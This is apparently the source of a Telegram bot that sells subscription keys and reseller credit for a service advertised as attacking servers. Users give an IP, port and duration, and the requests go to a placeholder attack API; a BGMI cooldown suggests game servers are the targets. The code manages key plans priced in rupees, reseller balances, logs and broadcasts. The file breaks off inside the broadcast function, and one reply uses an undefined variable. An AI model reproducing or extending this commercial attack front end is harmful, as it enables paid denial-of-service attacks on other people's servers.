#!/usr/bin/python3

import requests
import telebot
import datetime
import os
import time
import secrets
import threading
from datetime import timedelta
from threading import Timer
import pytz

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  CONFIG
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
BOT_TOKEN = os.environ.get("BOT_TOKEN")
bot = telebot.TeleBot(BOT_TOKEN)

ADMIN_IDS = {"7212246299"} # Ensure your ID is here

ATTACK_API_URL = "http://YOUR_API_DOMAIN_OR_IP/api/attack?ip={ip}&port={port}&time={time}"

USER_FILE        = "users.txt"
LOG_FILE         = "log.txt"
USER_ACCESS_FILE = "users_access.txt"
KEYS_FILE        = "keys.txt"
RESELLERS_FILE   = "resellers.txt"
BALANCE_FILE     = "balances.txt"
ALL_USERS_FILE   = "all_users.txt"

ist = pytz.timezone('Asia/Kolkata')

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  KEY PLANS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
KEY_PLANS = {
    "12hr":  {"duration": timedelta(hours=12), "cost": 30},
    "1day":  {"duration": timedelta(days=1),   "cost": 60},
    "3day":  {"duration": timedelta(days=3),   "cost": 180},
    "7day":  {"duration": timedelta(days=7),   "cost": 300},
    "30day": {"duration": timedelta(days=30),  "cost": 1000},
    "60day": {"duration": timedelta(days=60),  "cost": 1900},
}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  FILE HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def read_all_users() -> set:
    try:
        with open(ALL_USERS_FILE, "r") as f:
            return {l.strip() for l in f if l.strip()}
    except FileNotFoundError:
        return set()

def save_all_users(users: set):
    with open(ALL_USERS_FILE, "w") as f:
        for uid in users:
            f.write(f"{uid}\n")

def read_users() -> list:
    try:
        with open(USER_FILE, "r") as f:
            return [l.strip() for l in f if l.strip()]
    except FileNotFoundError:
        return []

def save_users(users: list):
    with open(USER_FILE, "w") as f:
        for uid in users:
            f.write(f"{uid}\n")

def read_user_access() -> dict:
    data = {}
    try:
        with open(USER_ACCESS_FILE, "r") as f:
            for line in f:
                line = line.strip()
                if ":" in line:
                    uid, expiry = line.split(":", 1)
                    data[uid] = {"expiry_time": float(expiry)}
    except FileNotFoundError:
        pass
    return data

def save_user_access(data: dict):
    with open(USER_ACCESS_FILE, "w") as f:
        for uid, info in data.items():
            f.write(f"{uid}:{info['expiry_time']}\n")

def read_keys() -> dict:
    keys = {}
    try:
        with open(KEYS_FILE, "r") as f:
            for line in f:
                line = line.strip()
                if "|" in line:
                    parts = line.split("|", 1)
                    keys[parts[0].strip()] = parts[1].strip()
    except FileNotFoundError:
        pass
    return keys

def save_keys(keys: dict):
    with open(KEYS_FILE, "w") as f:
        for key, plan in keys.items():
            f.write(f"{key}|{plan}\n")

def read_resellers() -> set:
    try:
        with open(RESELLERS_FILE, "r") as f:
            return {l.strip() for l in f if l.strip()}
    except FileNotFoundError:
        return set()

def save_resellers(resellers: set):
    with open(RESELLERS_FILE, "w") as f:
        for uid in resellers:
            f.write(f"{uid}\n")

def read_balances() -> dict:
    balances = {}
    try:
        with open(BALANCE_FILE, "r") as f:
            for line in f:
                line = line.strip()
                if ":" in line:
                    uid, bal = line.split(":", 1)
                    try:
                        balances[uid.strip()] = int(bal.strip())
                    except ValueError:
                        balances[uid.strip()] = 0
    except FileNotFoundError:
        pass
    return balances

def save_balances(balances: dict):
    with open(BALANCE_FILE, "w") as f:
        for uid, bal in balances.items():
            f.write(f"{uid}:{bal}\n")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  STATE & COOLDOWN
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
all_known_users: set   = read_all_users()
allowed_user_ids: list = read_users()
user_access: dict      = read_user_access()
active_keys: dict      = read_keys()
RESELLER_IDS: set      = read_resellers()
balances: dict         = read_balances()
bgmi_cooldown = {} 

active_attacks = {} 

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  UTILITIES
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def fmt_expiry(ts: float) -> str:
    return datetime.datetime.fromtimestamp(ts, tz=ist).strftime('%d %b %Y • %I:%M %p IST')

def generate_key() -> str:
    return "KEY-" + secrets.token_hex(10).upper()

def is_admin(uid: str) -> bool:
    return uid in ADMIN_IDS

def is_reseller(uid: str) -> bool:
    return uid in RESELLER_IDS

def is_admin_or_reseller(uid: str) -> bool:
    return is_admin(uid) or is_reseller(uid)

def get_balance(uid: str) -> int:
    return balances.get(uid, 0)

def log_action(user_id: str, action: str, message=None):
    if message and message.from_user.username:
        username = f"@{message.from_user.username}"
    else:
        username = f"ID:{user_id}"
        
    now = datetime.datetime.now(ist).strftime("%d-%m-%Y %H:%M:%S")
    with open(LOG_FILE, "a") as f:
        f.write(f"[{now}] {username} | {action}\n")

def count_keys_generated_by(user_id: str, username: str = None) -> int:
    """Reads the log file to count how many keys this user has generated."""
    count = 0
    search_str_id = f"ID:{user_id} | Generated key"
    search_str_user = f"@{username} | Generated key" if username else None
    try:
        with open(LOG_FILE, "r") as f:
            for line in f:
                if search_str_id in line or (search_str_user and search_str_user in line):
                    count += 1
    except FileNotFoundError:
        pass
    return count

def no_access_msg() -> str:
    return (
        "⛔ <b>𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗</b> ⛔\n\n"
        "You don't have an active subscription!\n"
        "Please use <code>/redeem &lt;key&gt;</code> to activate your premium access."
    )

def admin_only_msg() -> str:
    return "🛑 <b>Error:</b> This command is restricted to <b>Admins</b> only."

def admin_reseller_only_msg() -> str:
    return "🛑 <b>Error:</b> This command is restricted to <b>Admins</b> and <b>Resellers</b>."

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  EXPIRY MANAGEMENT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def remove_expired_users():
    current_time = time.time()
    expired = [uid for uid, info in user_access.items() if info["expiry_time"] <= current_time]

    for uid in expired:
        try:
            bot.send_message(uid, "⏰ <b>Your access plan has expired!</b>\nUse <code>/redeem</code> with a new key to reactivate.", parse_mode="HTML")
        except Exception:
            pass
        user_access.pop(uid, None)
        if uid in allowed_user_ids:
            allowed_user_ids.remove(uid)

    if expired:
        save_users(allowed_user_ids)
        save_user_access(user_access)

    Timer(60, remove_expired_users).start()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  HANDLERS — General
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = str(message.chat.id)
    if user_id not in all_known_users:
        all_known_users.add(user_id)
        save_all_users(all_known_users)

    name = message.from_user.first_name
    response = (
        f"🚀 <b>𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗕𝗼𝘁, {name}!</b> 🚀\n\n"
        "👑 <b>𝗣𝗼𝘄𝗲𝗿𝗳𝘂𝗹 | 𝗦𝗲𝗰𝘂𝗿𝗲 | 𝗙𝗮𝘀𝘁</b>\n\n"
        "🎯 <code>/attack [ip] [port] [time]</code> - Start Attack\n"
        "📊 <code>/status</code> - Live Attack Status\n"
        "📦 <code>/myplan</code> - Check Your Plan\n"
        "❓ <code>/help</code> - Commands Menu\n\n"
        "🔥 <i>𝘓𝘦𝘵'𝘴 𝘥𝘦𝘴𝘵𝘳𝘰𝘺 𝘴𝘰𝘮𝘦 𝘴𝘦𝘳𝘃𝘦𝘳𝘴!</i>"
    )
    bot.reply_to(message, response, parse_mode="HTML")

@bot.message_handler(commands=['help'])
def show_help(message):
    bot.reply_to(message,
        "📋 <b>𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 𝗠𝗘𝗡𝗨</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "👤 <b>USER COMMANDS</b>\n"
        "🔹 /start    → Welcome screen\n"
        "🔹 /id       → Account info\n"
        "🔹 /plan     → Plan expiry\n"
        "🔹 /redeem   → Activate a key\n"
        "🔹 /mylogs   → Your activity\n"
        "🔹 /rules    → Usage rules\n"
        "🔹 /status   → Bot status\n\n"
        "🤝 <b>RESELLER & ADMIN</b>\n"
        "🔸 /prices   → Key price list\n"
        "🔸 /genkey   → Generate key\n"
        "🔸 /listkeys → List unused keys\n"
        "🔸 /deletekey→ Delete a key\n"
        "🔸 /balance  → Check balance\n\n"
        "🛠 <b>ADMIN ONLY</b>\n"
        "⚙️ /admincmd → View admin panel\n"
        "━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode="HTML"
    )

@bot.message_handler(commands=['rules'])
def show_rules(message):
    bot.reply_to(message, "📜 <b>𝗥𝗨𝗟𝗘𝗦</b>\n━━━━━━━━━━━━━━━━━━━━━━\n1️⃣ Do not share your key.\n2️⃣ One key = one account.\n3️⃣ Keys are non-refundable.\n4️⃣ Violations may result in an instant ban.\n━━━━━━━━━━━━━━━━━━━━━━", parse_mode="HTML")

@bot.message_handler(commands=['prices'])
def show_prices(message):
    user_id = str(message.chat.id)
    if not is_admin_or_reseller(user_id):
        return bot.reply_to(message, admin_reseller_only_msg(), parse_mode="HTML")

    lines = ["💰 <b>𝗞𝗘𝗬 𝗣𝗥𝗜𝗖𝗘 𝗟𝗜𝗦𝗧</b>\n━━━━━━━━━━━━━━━━━━━━━━"]
    for plan, info in KEY_PLANS.items():
        lines.append(f"📦 <b>{plan.ljust(8)}</b> - ₹{info['cost']}")
    lines.append("━━━━━━━━━━━━━━━━━━━━━━\n💡 <i>Use <code>/genkey &lt;plan&gt;</code> to generate</i>")
    bot.reply_to(message, "\n".join(lines), parse_mode="HTML")

@bot.message_handler(commands=['id'])
def show_user_info(message):
    user_id  = str(message.chat.id)
    username = f"@{message.from_user.username}" if message.from_user.username else "—"
    role = "👑 Admin" if is_admin(user_id) else ("🤝 Reseller" if is_reseller(user_id) else "👤 User")
    
    if user_id in user_access:
        expiry_line = f"⏳ <b>Expires:</b> {fmt_expiry(user_access[user_id]['expiry_time'])}"
    else:
        expiry_line = "⏳ <b>Expires:</b> ❌ No Active Plan"
        
    bal_line = f"\n💵 <b>Balance:</b> ₹{get_balance(user_id)}" if is_reseller(user_id) or is_admin(user_id) else ""
    
    res = (
        f"👤 <b>𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗜𝗡𝗙𝗢</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 <b>ID:</b> <code>{user_id}</code>\n"
        f"📛 <b>Username:</b> {username}\n"
        f"🎭 <b>Role:</b> {role}\n"
        f"{expiry_line}"
        f"{bal_line}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )
    bot.reply_to(message, res, parse_mode="HTML")

@bot.message_handler(commands=['myplan', 'plan'])
def show_plan(message):
    user_id = str(message.chat.id)
    if user_id not in allowed_user_ids:
        return bot.reply_to(message, no_access_msg(), parse_mode="HTML")
    if user_id in user_access:
        bot.reply_to(message, f"📅 <b>𝗬𝗢𝗨𝗥 𝗣𝗟𝗔𝗡</b>\n━━━━━━━━━━━━━━━━━━━━━━\n✅ <b>Status:</b> Active\n⏳ <b>Expires:</b> {fmt_expiry(user_access[user_id]['expiry_time'])}", parse_mode="HTML")
    else:
        bot.reply_to(message, "⚠️ No expiry info found.")

@bot.message_handler(commands=['mylogs'])
def show_my_logs(message):
    user_id = str(message.chat.id)
    username_str = f"@{message.from_user.username}" if message.from_user.username else None
    
    if user_id not in allowed_user_ids:
        return bot.reply_to(message, no_access_msg(), parse_mode="HTML")
        
    try:
        with open(LOG_FILE, "r") as f:
            lines = f.readlines()
            
        user_logs = []
        for l in lines:
            if f"ID:{user_id}" in l or (username_str and username_str in l):
                user_logs.append(l.strip())
                
        if user_logs:
            recent_logs = "\n".join(user_logs[-15:])
            bot.reply_to(message, f"📋 <b>𝗬𝗢𝗨𝗥 𝗔𝗖𝗧𝗜𝗩𝗜𝗧𝗬</b>\n━━━━━━━━━━━━━━━━━━━━━━\n{recent_logs}\n━━━━━━━━━━━━━━━━━━━━━━", parse_mode="HTML")
        else:
            bot.reply_to(message, "📝 No activity found for your account.")
    except FileNotFoundError:
        bot.reply_to(message, "📝 No logs found.")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  KEY SYSTEM
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    user_id = str(message.chat.id)
    
    if user_id not in all_known_users:
        all_known_users.add(user_id)
        save_all_users(all_known_users)

    parts = message.text.split()
    if len(parts) < 2: return bot.reply_to(message, "⚠️ <b>Usage:</b> <code>/redeem &lt;key&gt;</code>", parse_mode="HTML")

    key = parts[1].strip().upper()
    if key not in active_keys: return bot.reply_to(message, "❌ <b>𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗞𝗘𝗬</b>\nThe key is either incorrect or has already been used.", parse_mode="HTML")

    plan_label = active_keys[key]
    plan_info  = KEY_PLANS.get(plan_label)
    if not plan_info: return bot.reply_to(message, "❌ Unknown plan on this key. Contact admin.")

    now = datetime.datetime.now(ist)
    expiry_ts = (now + plan_info["duration"]).timestamp()

    if user_id not in allowed_user_ids:
        allowed_user_ids.append(user_id)
        with open(USER_FILE, "a") as f: f.write(f"{user_id}\n")

    user_access[user_id] = {"expiry_time": expiry_ts}
    save_user_access(user_access)

    del active_keys[key]
    save_keys(active_keys)

    log_action(user_id, f"Redeemed key | plan={plan_label}", message)
    bot.reply_to(message, f"✅ <b>𝗞𝗘𝗬 𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬!</b>\n━━━━━━━━━━━━━━━━━━━━━━\n📦 <b>Plan:</b> {plan_label}\n⏳ <b>Expires:</b> {fmt_expiry(expiry_ts)}\n\n<i>Enjoy your premium access!</i> 🎉", parse_mode="HTML")

@bot.message_handler(commands=['genkey'])
def gen_key(message):
    user_id = str(message.chat.id)
    username = message.from_user.username
    if not is_admin_or_reseller(user_id): return bot.reply_to(message, admin_reseller_only_msg(), parse_mode="HTML")

    parts = message.text.split()
    if len(parts) < 2 or parts[1] not in KEY_PLANS:
        return bot.reply_to(message, f"⚠️ <b>Usage:</b> <code>/genkey &lt;plan&gt;</code>\n<b>Plans:</b> {', '.join(KEY_PLANS.keys())}", parse_mode="HTML")

    plan = parts[1]
    cost = KEY_PLANS[plan]["cost"]

    if is_reseller(user_id) and not is_admin(user_id):
        current_bal = get_balance(user_id)
        if current_bal < cost:
            return bot.reply_to(message, f"❌ <b>𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 𝗕𝗔𝗟𝗔𝗡𝗖𝗘</b>\n━━━━━━━━━━━━━━━━━━━━━━\n💰 <b>Needed:</b> ₹{cost}\n💵 <b>Balance:</b> ₹{current_bal}\n\n<i>Please contact admin to add funds.</i>", parse_mode="HTML")
        balances[user_id] = current_bal - cost
        save_balances(balances)

    key = generate_key()
    active_keys[key] = plan
    save_keys(active_keys)
    log_action(user_id, f"Generated key | plan={plan} | cost=₹{cost}", message)
    
    # Calculate keys generated
    keys_gen = count_keys_generated_by(user_id, username)

    bal_info = f"\n💵 <b>Remaining Bal:</b> ₹{get_balance(user_id)}" if is_reseller(user_id) else ""
    
    res = (
        f"🔑 <b>𝗞𝗘𝗬 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘𝗗!</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎟️ <b>Key:</b> <code>{key}</code>\n"
        f"📦 <b>Plan:</b> {plan}\n"
        f"💰 <b>Cost:</b> ₹{cost}{bal_info}\n"
        f"📊 <b>Total Keys Generated:</b> {keys_gen}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<i>Tap the key above to copy it!</i>"
    )
    bot.reply_to(message, res, parse_mode="HTML")

@bot.message_handler(commands=['listkeys'])
def list_keys(message):
    user_id = str(message.chat.id)
    if not is_admin_or_reseller(user_id): return bot.reply_to(message, admin_reseller_only_msg(), parse_mode="HTML")
    if not active_keys: return bot.reply_to(message, "⚠️ No unused keys available.")
    
    lines = ["🔑 <b>𝗨𝗡𝗨𝗦𝗘𝗗 𝗞𝗘𝗬𝗦</b>\n━━━━━━━━━━━━━━━━━━━━━━"]
    for k, plan in active_keys.items(): lines.append(f"🔸 <code>{k}</code> [{plan}]")
    bot.reply_to(message, "\n".join(lines)[:4000], parse_mode="HTML")

@bot.message_handler(commands=['deletekey'])
def delete_key(message):
    user_id = str(message.chat.id)
    if not is_admin_or_reseller(user_id): return bot.reply_to(message, admin_reseller_only_msg(), parse_mode="HTML")
    parts = message.text.split()
    if len(parts) < 2: return bot.reply_to(message, "⚠️ <b>Usage:</b> <code>/deletekey &lt;key&gt;</code>", parse_mode="HTML")
    
    key = parts[1].strip().upper()
    if key in active_keys:
        del active_keys[key]
        save_keys(active_keys)
        bot.reply_to(message, f"✅ <b>Key successfully deleted.</b>", parse_mode="HTML")
    else:
        bot.reply_to(message, "❌ Key not found.", parse_mode="HTML")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  BALANCE SYSTEM
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg(), parse_mode="HTML")
    
    parts = message.text.split()
    if len(parts) < 3: return bot.reply_to(message, "⚠️ <b>Usage:</b> <code>/addbalance &lt;userId&gt; &lt;amount&gt;</code>", parse_mode="HTML")

    target = parts[1]
    try:
        amount = int(parts[2])
        if amount <= 0: raise ValueError
    except ValueError:
        return bot.reply_to(message, "❌ Amount must be a positive number.", parse_mode="HTML")

    if target not in RESELLER_IDS: return bot.reply_to(message, "❌ This user is not a reseller.", parse_mode="HTML")

    balances[target] = get_balance(target) + amount
    save_balances(balances)
    new_bal = get_balance(target)
    
    log_action(user_id, f"Added ₹{amount} balance to reseller={target}", message)
    
    # Notify Admin
    admin_res = (
        f"✅ <b>𝗕𝗮𝗹𝗮𝗻𝗰𝗲 𝗔𝗱𝗱𝗲𝗱!</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 <b>Reseller:</b> <code>{target}</code>\n"
        f"➕ <b>Added:</b> ₹{amount}\n"
        f"💵 <b>New Balance:</b> ₹{new_bal}"
    )
    bot.reply_to(message, admin_res_msg, parse_mode="HTML")
    
    # Notify Reseller
    try:
        reseller_msg = (
            f"💰 <b>𝗬𝗼𝘂𝗿 𝗕𝗮𝗹𝗮𝗻𝗰𝗲 𝗛𝗮𝘀 𝗕𝗲𝗲𝗻 𝗨𝗽𝗱𝗮𝘁𝗲𝗱!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"➕ <b>Added:</b> ₹{amount}\n"
            f"💵 <b>Current Balance:</b> ₹{new_bal}\n\n"
            f"<i>You can now generate more keys using /genkey</i>"
        )
        bot.send_message(target, reseller_msg, parse_mode="HTML")
    except Exception:
        pass


@bot.message_handler(commands=['setbalance'])
def set_balance(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg(), parse_mode="HTML")
    
    parts = message.text.split()
    if len(parts) < 3: return bot.reply_to(message, "⚠️ <b>Usage:</b> <code>/setbalance &lt;userId&gt; &lt;amount&gt;</code>", parse_mode="HTML")

    target = parts[1]
    try:
        amount = int(parts[2])
        if amount < 0: raise ValueError
    except ValueError:
        return bot.reply_to(message, "❌ Amount must be 0 or more.", parse_mode="HTML")

    balances[target] = amount
    save_balances(balances)
    log_action(user_id, f"Set balance of reseller={target} to ₹{amount}", message)
    bot.reply_to(message, f"✅ <b>Balance for <code>{target}</code> set to ₹{amount}.</b>", parse_mode="HTML")

@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = str(message.chat.id)
    parts = message.text.split()
    
    if is_admin(user_id) and len(parts) > 1:
        target = parts[1]
        return bot.reply_to(message, f"💰 <b>Reseller <code>{target}</code> Balance:</b> ₹{get_balance(target)}", parse_mode="HTML")

    if is_reseller(user_id):
        return bot.reply_to(message, f"💰 <b>Your Balance:</b> ₹{get_balance(user_id)}", parse_mode="HTML")
        
    bot.reply_to(message, "❌ You are not a reseller.", parse_mode="HTML")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  ADMIN & RESELLER MANAGEMENT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@bot.message_handler(commands=['admincmd'])
def admin_commands(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg(), parse_mode="HTML")
    bot.reply_to(message,
        "🛠 <b>𝗔𝗗𝗠𝗜𝗡 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "👤 <b>USER MANAGEMENT</b>\n"
        "🔹 <code>/add &lt;id&gt; &lt;plan&gt;</code>\n"
        "🔹 <code>/remove &lt;id&gt;</code>\n"
        "🔹 <code>/allusers</code>\n"
        "🔹 <code>/extendall &lt;num&gt; &lt;unit&gt;</code>\n\n"
        "🤝 <b>RESELLER</b>\n"
        "🔸 <code>/addreseller &lt;id&gt; &lt;₹&gt;</code>\n"
        "🔸 <code>/rmreseller &lt;id&gt;</code>\n"
        "🔸 <code>/resellers</code>\n"
        "🔸 <code>/addbalance &lt;id&gt; &lt;₹&gt;</code>\n"
        "🔸 <code>/setbalance &lt;id&gt; &lt;₹&gt;</code>\n\n"
        "📢 <b>BROADCASTING</b>\n"
        "🔊 <code>/broadcast &lt;msg&gt;</code> (All Users)\n"
        "🔊 <code>/bcpaid &lt;msg&gt;</code> (Paid Only)\n"
        "🔊 <code>/bcreseller &lt;msg&gt;</code> (Resellers Only)\n\n"
        "📝 <b>LOGS</b>\n"
        "📄 <code>/logs</code> - Download file\n"
        "🗑 <code>/clearlogs</code> - Wipe data\n"
        "━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode="HTML"
    )

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg(), parse_mode="HTML")
    parts = message.text.split()
    if len(parts) < 3 or parts[2] not in KEY_PLANS:
        return bot.reply_to(message, f"⚠️ <b>Usage:</b> <code>/add &lt;userId&gt; &lt;plan&gt;</code>\n<b>Plans:</b> {', '.join(KEY_PLANS.keys())}", parse_mode="HTML")

    target = parts[1]
    plan = parts[2]
    expiry_ts = (datetime.datetime.now(ist) + KEY_PLANS[plan]["duration"]).timestamp()

    if target not in allowed_user_ids:
        allowed_user_ids.append(target)
        with open(USER_FILE, "a") as f: f.write(f"{target}\n")
        prefix = "✅ <b>User Added</b>"
    else:
        prefix = "🔄 <b>Access Updated</b>"

    user_access[target] = {"expiry_time": expiry_ts}
    save_user_access(user_access)
    
    if target not in all_known_users:
        all_known_users.add(target)
        save_all_users(all_known_users)

    log_action(user_id, f"Added user={target} plan={plan}", message)
    bot.reply_to(message, f"{prefix}\n🆔 <b>ID:</b> <code>{target}</code>\n⏳ <b>Expires:</b> {fmt_expiry(expiry_ts)}", parse_mode="HTML")

@bot.message_handler(commands=['extendall'])
def extend_all(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg(), parse_mode="HTML")
    
    parts = message.text.split()
    if len(parts) < 3:
        return bot.reply_to(message, "⚠️ <b>Usage:</b> <code>/extendall &lt;number&gt; &lt;hours/days&gt;</code>\nExample: <code>/extendall 2 hours</code>", parse_mode="HTML")
    
    try:
        amount = int(parts[1])
        unit = parts[2].lower()
    except ValueError:
        return bot.reply_to(message, "❌ Number must be an integer.", parse_mode="HTML")
        
    if "hour" in unit:
        time_to_add = timedelta(hours=amount)
        display_unit = f"{amount} hours"
    elif "day" in unit:
        time_to_add = timedelta(days=amount)
        display_unit = f"{amount} days"
    else:
        return bot.reply_to(message, "❌ Unit must be 'hours' or 'days'.", parse_mode="HTML")

    users_extended = 0
    current_time = time.time()
    
    for uid in list(user_access.keys()):
        if user_access[uid]["expiry_time"] > current_time:
            current_expiry_dt = datetime.datetime.fromtimestamp(user_access[uid]["expiry_time"])
            new_expiry_ts = (current_expiry_dt + time_to_add).timestamp()
            user_access[uid]["expiry_time"] = new_expiry_ts
            users_extended += 1
            
    save_user_access(user_access)
    log_action(user_id, f"Extended all keys by {display_unit}", message)
    
    success_msg = (
        f"🎉 <b>𝗧𝗶𝗺𝗲 𝗘𝘅𝘁𝗲𝗻𝗱𝗲𝗱 𝗳𝗼𝗿 𝗔𝗟𝗟 𝗨𝘀𝗲𝗿𝘀!</b>\n\n"
        f"⏰ <b>Added:</b> {display_unit}\n"
        f"👥 <b>Users Updated:</b> {users_extended}\n\n"
        f"<i>Enjoy!</i>"
    )
    bot.reply_to(message, success_msg, parse_mode="HTML")

@bot.message_handler(commands=['addreseller'])
def add_reseller(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg(), parse_mode="HTML")
    parts = message.text.split()
    
    # Updated to optionally accept initial balance: /addreseller ID Balance
    if len(parts) < 2: return bot.reply_to(message, "⚠️ <b>Usage:</b> <code>/addreseller &lt;userId&gt; [balance]</code>", parse_mode="HTML")
    
    target = parts[1]
    
    initial_bal = 0
    if len(parts) >= 3:
        try:
            initial_bal = int(parts[2])
        except ValueError:
            pass

    RESELLER_IDS.add(target)
    save_resellers(RESELLER_IDS)
    
    balances[target] = get_balance(target) + initial_bal
    save_balances(balances)
    
    log_action(user_id, f"Added reseller={target} with {initial_bal}", message)
    
    # Admin notification
    bot.reply_to(message, f"✅ <b>Reseller Added!</b>\n🆔 <b>ID:</b> <code>{target}</code>\n💵 <b>Starting Balance:</b> ₹{balances[target]}", parse_mode="HTML")
    
    # Send formatted promotion message to the new Reseller
    try:
        promo_msg = (
            f"💰 <b>𝗬𝗼𝘂 𝗔𝗿𝗲 𝗣𝗿𝗼𝗺𝗼𝘁𝗲𝗱 𝗧𝗼 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💵 <b>Balance:</b> ₹{balances[target]}\n"
            f"🔑 <b>Total Keys Generated:</b> 0\n\n"
            f"📋 <i>Use <code>/prices</code> to see key prices</i>\n"
            f"🔑 <i>Use <code>/genkey &lt;duration&gt;</code> to generate key</i>"
        )
        bot.send_message(target, promo_msg, parse_mode="HTML")
    except Exception:
        pass


@bot.message_handler(commands=['rmreseller'])
def remove_reseller(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg(), parse_mode="HTML")
    parts = message.text.split()
    if len(parts) < 2: return bot.reply_to(message, "⚠️ <b>Usage:</b> <code>/rmreseller &lt;userId&gt;</code>", parse_mode="HTML")
    
    target = parts[1]
    if target in RESELLER_IDS:
        RESELLER_IDS.discard(target)
        save_resellers(RESELLER_IDS)
        bot.reply_to(message, f"✅ <b>Reseller <code>{target}</code> removed.</b>", parse_mode="HTML")

@bot.message_handler(commands=['resellers'])
def list_resellers(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg(), parse_mode="HTML")
    if not RESELLER_IDS: return bot.reply_to(message, "⚠️ No resellers found.", parse_mode="HTML")
    
    lines = ["🤝 <b>𝗥𝗘𝗦𝗘𝗟𝗟𝗘𝗥𝗦</b>\n━━━━━━━━━━━━━━━━━━━━━━"]
    for uid in RESELLER_IDS: lines.append(f"🆔 <code>{uid}</code> → ₹{get_balance(uid)}")
    bot.reply_to(message, "\n".join(lines)[:4000], parse_mode="HTML")

@bot.message_handler(commands=['logs'])
def send_logs(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return
    if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
        with open(LOG_FILE, "rb") as f:
            bot.send_document(message.chat.id, f)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_cmd(message):
    user_id = str(message.chat.id)
    if not is_admin(user_id): return
    
    if os.path.exists(LOG_FILE):
        open(LOG_FILE, "w").close()
        bot.reply_to(message, "✅ <b>Logs completely wiped.</b>", parse_mode="HTML")
    else:
        bot.reply_to(message, "⚠️ No logs to clear.", parse_mode="HTML")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  TARGETED BROADCASTING SYSTEM
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def execute_broadcast(sender_message, target_list, prefix_msg):
    parts = sender_message.text.split(maxsplit=1)
    if len(parts) < 2:
        return bot.reply_to(sender_message, f"⚠️ <b>Usage:</b> <code>{parts[0]} &lt;message&gt;</code>", parse_mode="HTML")

